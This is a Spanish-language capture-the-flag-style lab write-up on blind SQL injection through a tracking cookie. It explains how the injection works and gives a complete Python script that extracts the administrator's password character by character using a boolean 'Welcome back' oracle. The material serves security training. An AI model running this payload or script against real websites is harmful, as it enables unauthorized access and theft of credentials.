En este caso, tocaremos un nuevo concepto sobre las **SQL Injection**, ahora tocaremos la *Blind SQL Injection*.


### Explicación del laboratorio

![[110.png]]

Las diferencias entre una **SQL Injection** normal frente a una *Blink SQL Injection* son las siguientes: 

- En una **SQL Injection** normal, podemos ver directamente por pantalla tanto los datos reales que tiene la base de datos, como los errores. 
- En una *Blind SQL Injection* no podremos ver de forma directa los datos ni los errores, lo que podremos ver son cambios pequeños en la propia página web, puede ser texto que no se muestra, o cambios en los tiempos de respuesta, etc... 

![[111.png]]

De primeras, el laboratorio nos dice que usa una **_tracking cookie_** para analizar y realizar consultas SQL, además de que al realizar consultas SQL, no obtenemos datos de forma directa; en su lugar, obtenemos un mensaje de "Welcome back" en caso de que la consulta sea exitosa.

En cuanto a la información de la base de datos, existe una tabla llamada **_users_** y un usuario llamado **_administrator_**, para resolver el laboratorio, tenemos que conseguir su contraseña e iniciar sesión.

También otro detalle muy importante, la contraseña contiene letras en minúsculas y números:

Con estos datos en mente, podemos programar un script en Python que nos permita saber todos los caracteres de la contraseña en base a intentos de adivinar el carácter uno a uno:

```python
#!/usr/bin/python3
import requests
import string
import time

URL = "https://TU_URL"
SESSION = "RELLENAR_AQUÍ"
TRACKING = "RELLENAR_AQUÍ"

chars = string.ascii_lowercase + string.digits
password = ""

for pos in range(1, 21):
    for c in chars:
        payload = f"{TRACKING}' and (select substring(password,{pos},1) from users where username='administrator')='{c}'-- -"

        cookies = {
            "TrackingId": payload,
            "session": SESSION
        }

        try:
            r = requests.get(URL, cookies=cookies)
        except:
            continue

        if "Welcome back" in r.text:
            password += c
            print(f"[+] Password: {password}")
            break

        time.sleep(0.2)
```
